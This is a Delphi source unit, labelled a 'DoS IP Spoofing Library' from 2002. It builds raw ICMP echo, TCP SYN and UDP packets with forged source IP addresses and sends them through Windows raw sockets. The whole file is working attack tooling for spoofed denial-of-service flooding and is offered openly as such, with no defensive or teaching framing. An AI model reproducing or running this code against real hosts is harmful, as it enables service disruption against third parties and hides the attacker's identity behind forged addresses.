{
  DoS IP Spoofing Library by Aphex, 2002 
  unremote@knology.net
}

unit DoS;

interface

type
  TBufferArray = array[0..65535] of byte;

  TDoS = class(TObject)
  private
  public
    procedure SendPING(TargetIP: string; SourceIP: string; Data: string);
    procedure SendSYN(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer);
    procedure SendUDP(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer; Data: string);
  end;

type
  iph = record
    ip_verlen: byte;
    ip_tos: byte;
    ip_len: word;
    ip_id: word;
    ip_offset: word;
    ip_ttl: byte;
    ip_protocol: byte;
    ip_checksum: word;
    ip_saddr: longword;
    ip_daddr: longword;
  end;

  icmph = record
    ih_type: byte;
    ih_code: byte;
    ih_checksum: word;
    ih_id: word;
    ih_seq: word;
  end;

  tcph = record
    th_sport: word;
    th_dport: word;
    th_seq: longword;
    th_ack: longword;
    th_len: byte;
    th_flags: byte;
    th_win: word;
    th_checksum: word;
    th_upr: word;
  end;

  udph = record
    uh_sport: word;
    uh_dport: word;
    uh_len: word;
    uh_checksum: word;
  end;

  sb = packed record
    sb1, sb2, sb3, sb4: char;
  end;
  sw = packed record
    sw1, sw2: word;
  end;
  TInAddr = record
    case integer of
      0: (ssb: sb);
      1: (ssw: sw);
      2: (saddr: longint);
  end;
  TSockAddr = record
    case integer of
      0: (sin_family: word; sin_port: word; sin_addr: TInAddr; sin_zero: array[0..7] of char);
      1: (sa_family: word; sa_data: array[0..13] of char)
  end; 

  TWSAData = record
    ver: Word;
    hgh: Word;
    dsc: array[0..256] of char;
    sys: array[0..128] of char;
    skt: Word;
    udp: Word;
   ven: PChar;
  end;

function closesocket(sk: integer): integer; stdcall;
function htons(hs: word): word; stdcall;
function inet_addr(cp: pchar): longint; stdcall;
function sendto(sk: integer; var bf; ln, fl: integer; var ad: TSockAddr; le: integer): integer; stdcall;
function setsockopt(sk: integer; lv, op: integer; ov: PChar; ol: integer): integer; stdcall;
function socket(af, st, pr: integer): integer; stdcall;
function WSACleanup: integer; stdcall;
function WSAGetLastError: integer; stdcall;
function WSAStartup(vr: word; var ws: TWSAData): integer; stdcall;

const
 INVALID_SOCKET = integer(not(0));

implementation

function htons; external 'WS2_32.DLL' name 'htons';
function inet_addr; external 'WS2_32.DLL' name 'inet_addr';
function closesocket; external 'WS2_32.DLL' name 'closesocket';
function sendto; external 'WS2_32.DLL' name 'sendto';
function setsockopt; external 'WS2_32.DLL' name 'setsockopt';
function socket; external 'WS2_32.DLL' name 'socket';
function WSACleanup; external 'WS2_32.DLL' name 'WSACleanup';
function WSAGetLastError; external 'WS2_32.DLL' name 'WSAGetLastError';
function WSAStartup; external 'WS2_32.DLL' name 'WSAStartup';

function CheckSum(var Buffer; Size: integer): word;
type
  TWordArray = Array[0..1] of word;
var
  lSumm: LongWord;
  iLoop: integer;
begin
  lSumm := 0;
  iLoop := 0;
  while Size > 1 do
  begin
    lSumm := lSumm + TWordArray(Buffer)[iLoop];
    inc(iLoop);
    Size := Size - SizeOf(word);
  end;
  if Size = 1 then lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]);
  lSumm := (lSumm shr 16) + (lSumm and $FFFF);
  lSumm := lSumm + (lSumm shr 16);
  Result := word(not lSumm);
end;

procedure PNGHeader(FromIP: string; FromPort: word; ToIP: string; ToPort: word; Data: string; var Buffer: TBufferArray; var Socket: TSockAddr; var Size: word);
var
  ipHdr: iph;
  icmpHdr: icmph;
  ChecksumSize: Word;
  DataPointer: ^Byte;
  procedure IncPtr(Value: integer);
  begin
    DataPointer := pointer(integer(DataPointer) + Value);
  end;
begin
  Size := sizeof(ipHdr) + sizeof(icmpHdr) + length(Data);
  ipHdr.ip_verlen := ((4 shl 4) or sizeof(ipHdr) div sizeof(longword));
  ipHdr.ip_tos := 0;
  ipHdr.ip_len := htons(Size);
  ipHdr.ip_id := 0;
  ipHdr.ip_offset := 0;
  ipHdr.ip_ttl := 128;
  ipHdr.ip_protocol := 1;
  ipHdr.ip_checksum := 0;
  ipHdr.ip_saddr := inet_addr(pchar(FromIP));
  ipHdr.ip_daddr := inet_addr(pchar(ToIP));
  ChecksumSize := 0;
  icmpHdr.ih_type := 8;
  icmpHdr.ih_code := 0;
  icmpHdr.ih_checksum := 0;
  icmpHdr.ih_id := 1;
  icmpHdr.ih_seq := 1;
  DataPointer := @Buffer[0];
  FillChar(Buffer, SizeOf(Buffer), 0);
  Move(icmpHdr, DataPointer^, sizeof(icmpHdr));
  IncPtr(sizeof(icmpHdr));
  ChecksumSize := ChecksumSize + sizeof(icmpHdr);
  Move(Data[1], DataPointer^, length(Data));
  IncPtr(length(Data));
  ChecksumSize := ChecksumSize + length(Data);
  icmpHdr.ih_checksum := CheckSum(Buffer, ChecksumSize);
  FillChar(Buffer, sizeof(Buffer), 0);
  DataPointer := @Buffer[0];
  Move(ipHdr, DataPointer^, sizeof(ipHdr));
  IncPtr(sizeof(ipHdr));
  Move(icmpHdr, DataPointer^, sizeof(icmpHdr));
  IncPtr(sizeof(icmpHdr));
  Move(Data[1], DataPointer^, length(Data));
  Socket.sin_family := 2;
  Socket.sin_port := htons(0);
  Socket.sin_addr.saddr := inet_addr(pchar(ToIP));
end;

procedure SYNHeader(FromIP: string; FromPort: word; ToIP: string; ToPort: word; var Buffer: TBufferArray; var Socket: TSockAddr; var Size: word);
var
  ipHdr: iph;
  tcpHdr: tcph;
  TcpHeaderLen: word;
  ChecksumSize: word;
  DataPointer: ^byte;
  procedure IncPtr(Value: integer);
  begin
    DataPointer := pointer(integer(DataPointer) + Value);
  end;
begin
  Size := sizeof(ipHdr) + sizeof(tcpHdr);
  ipHdr.ip_verlen := ((4 shl 4) or sizeof(ipHdr) div sizeof(longword));
  ipHdr.ip_tos := 0;
  ipHdr.ip_len := htons(Size);
  ipHdr.ip_id := 0;
  ipHdr.ip_offset := 0;
  ipHdr.ip_ttl := 128;
  ipHdr.ip_protocol := 6;
  ipHdr.ip_checksum := 0;
  ipHdr.ip_saddr := inet_addr(pchar(FromIP));
  ipHdr.ip_daddr := inet_addr(pchar(ToIP));
  ChecksumSize := 0;
  tcpHdr.th_sport := htons(FromPort);
  tcpHdr.th_dport := htons(ToPort);
  tcpHdr.th_seq := Random(4294967295);
  tcpHdr.th_ack := 0;
  tcpHdr.th_len := 80;
  tcpHdr.th_flags := 2;
  tcpHdr.th_win := htons(65535);
  tcpHdr.th_checksum := 0;
  tcpHdr.th_upr := 0;
  DataPointer := @Buffer[0];
  FillChar(Buffer, SizeOf(Buffer), 0);
  Move(ipHdr.ip_saddr, DataPointer^, SizeOf(ipHdr.ip_saddr));
  IncPtr(SizeOf(ipHdr.ip_saddr));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_saddr);
  Move(ipHdr.ip_daddr, DataPointer^, sizeof(ipHdr.ip_daddr));
  IncPtr(SizeOf(ipHdr.ip_daddr));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_daddr);
  IncPtr(1);
  Inc(ChecksumSize);
  Move(ipHdr.ip_protocol, DataPointer^, sizeof(ipHdr.ip_protocol));
  IncPtr(sizeof(ipHdr.ip_protocol));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_protocol);
  TcpHeaderLen := htons(sizeof(tcpHdr));
  Move(TcpHeaderLen, DataPointer^, sizeof(TcpHeaderLen));
  IncPtr(sizeof(TcpHeaderLen));
  ChecksumSize := ChecksumSize + sizeof(TcpHeaderLen);
  Move(tcpHdr, DataPointer^, sizeof(tcpHdr));
  IncPtr(sizeof(tcpHdr));
  ChecksumSize := ChecksumSize + sizeof(tcpHdr);
  tcpHdr.th_checksum := CheckSum(Buffer, ChecksumSize);
  FillChar(Buffer, sizeof(Buffer), 0);
  DataPointer := @Buffer[0];
  Move(ipHdr, DataPointer^, sizeof(ipHdr));
  IncPtr(sizeof(ipHdr));
  Move(tcpHdr, DataPointer^, sizeof(tcpHdr));
  Socket.sin_family := 2;
  Socket.sin_port := htons(0);
  Socket.sin_addr.saddr := inet_addr(pchar(ToIP));
end;

procedure UDPHeader(FromIP: string; FromPort: word; ToIP: string; ToPort: word; Data: string; var Buffer: TBufferArray; var Socket: TSockAddr; var Size: word);
var
  ipHdr: iph;
  udpHdr: udph;
  ChecksumSize: word;
  DataPointer: ^byte;
  procedure IncPtr(Value: integer);
  begin
    DataPointer := pointer(integer(DataPointer) + Value);
  end;
begin
  Size := sizeof(ipHdr) + sizeof(udpHdr) + length(Data);
  ipHdr.ip_verlen := ((4 shl 4) or sizeof(ipHdr) div sizeof(longword));
  ipHdr.ip_tos := 0;
  ipHdr.ip_len := htons(Size);
  ipHdr.ip_id := 0;
  ipHdr.ip_offset := 0;
  ipHdr.ip_ttl := 128;
  ipHdr.ip_protocol := 17;
  ipHdr.ip_checksum := 0;
  ipHdr.ip_saddr := inet_addr(pchar(FromIP));
  ipHdr.ip_daddr := inet_addr(pchar(ToIP));
  ChecksumSize := 0;
  udpHdr.uh_sport := htons(FromPort) ;
  udpHdr.uh_dport := htons(ToPort) ;
  udpHdr.uh_len := htons(sizeof(udpHdr) + length(Data)) ;
  udpHdr.uh_checksum := 0;
  DataPointer := @Buffer[0];
  FillChar(Buffer, SizeOf(Buffer), 0);
  Move(ipHdr.ip_saddr, DataPointer^, SizeOf(ipHdr.ip_saddr));
  IncPtr(SizeOf(ipHdr.ip_saddr));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_saddr);
  Move(ipHdr.ip_daddr, DataPointer^, sizeof(ipHdr.ip_daddr));
  IncPtr(SizeOf(ipHdr.ip_daddr));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_daddr);
  IncPtr(1);
  Inc(ChecksumSize);
  Move(ipHdr.ip_protocol, DataPointer^, sizeof(ipHdr.ip_protocol));
  IncPtr(sizeof(ipHdr.ip_protocol));
  ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_protocol);
  Move(udpHdr.uh_len, DataPointer^, sizeof(udpHdr.uh_len));
  IncPtr(sizeof(udpHdr.uh_len));
  ChecksumSize := ChecksumSize + sizeof(udpHdr.uh_len);
  Move(udpHdr, DataPointer^, sizeof(udpHdr));
  IncPtr(sizeof(udpHdr));
  ChecksumSize := CheckSumSize + sizeof(udpHdr);
  Move(Data[1], DataPointer^, length(Data));
  IncPtr(Length(Data));
  ChecksumSize := ChecksumSize + length(Data);
  udpHdr.uh_checksum := Checksum(Buffer, ChecksumSize);
  FillChar(Buffer, sizeof(Buffer), 0);
  DataPointer := @Buffer[0];
  Move(ipHdr, DataPointer^, sizeof(ipHdr));
  IncPtr(sizeof(ipHdr));
  Move(udpHdr, DataPointer^, sizeof(udpHdr));
  IncPtr(sizeof(udpHdr));
  Move(Data[1], DataPointer^, length(Data));
  Socket.sin_family := 2;
  Socket.sin_port := htons(0);
  Socket.sin_addr.saddr := inet_addr(pchar(ToIP));
end;

procedure TDoS.SendPING(TargetIP: string; SourceIP: string; Data: string);
var
  sh: integer;
  op: integer;
  rt: integer;
  Buffer: TBufferArray;
  Sck: TSockAddr;
  Size: Word;
  wsdata: TWSAdata;
begin
  rt := WSAStartup($0002, wsdata);
  if rt <> 0 then exit;
  try
    sh := Socket(2, 3, 0);
    if (sh = INVALID_SOCKET) then exit;
    op := 1;
    rt := SetSockOpt(sh, 0, 2, @op, sizeof(op));
    if rt = -1 then exit;
    PNGHeader(SourceIP,  0, TargetIP, 0, Data, Buffer, Sck, Size);
    SendTo(sh, Buffer, Size, 0, Sck, sizeof(Sck));
    CloseSocket(sh);
  finally
    WSACleanup;
  end;
end;

procedure TDoS.SendSYN(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer);
var
  sh: integer;
  op: integer;
  rt: integer;
  Buffer: TBufferArray;
  Sck: TSockAddr;
  Size: Word;
  wsdata: TWSAdata;
begin
  rt := WSAStartup($0002, wsdata);
  if rt <> 0 then exit;
  try
    sh := Socket(2, 3, 0);
    if (sh = INVALID_SOCKET) then exit;
    op := 1;
    rt := SetSockOpt(sh, 0, 2, @op, sizeof(op));
    if rt = -1 then exit;
    SYNHeader(SourceIP, SourcePort, TargetIP, TargetPort, Buffer, Sck, Size);
    SendTo(sh, Buffer, Size, 0, Sck, sizeof(Sck));
    CloseSocket(sh);
  finally
    WSACleanup;
  end;
end;

procedure TDoS.SendUDP(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer; Data: string);
var
  sh: integer;
  op: integer;
  rt: integer;
  Buffer: TBufferArray;
  Sck: TSockAddr;
  Size: word;
  wsdata: TWSAdata;
begin
  rt := WSAStartup($0002, wsdata);
  if rt <> 0 then exit;
  try
    sh := Socket(2, 3, 0);
    if (sh = INVALID_SOCKET) then exit;
    op := 1;
    rt := SetSockOpt(sh, 0, 2, @op, sizeof(op));
    if rt = -1 then exit;
    UDPHeader(SourceIP,  SourcePort, TargetIP, TargetPort, Data, Buffer, Sck, Size);
    SendTo(sh, Buffer, Size, 0, Sck, sizeof(Sck));
    CloseSocket(sh);
  finally
    WSACleanup;
  end;
end;

end.

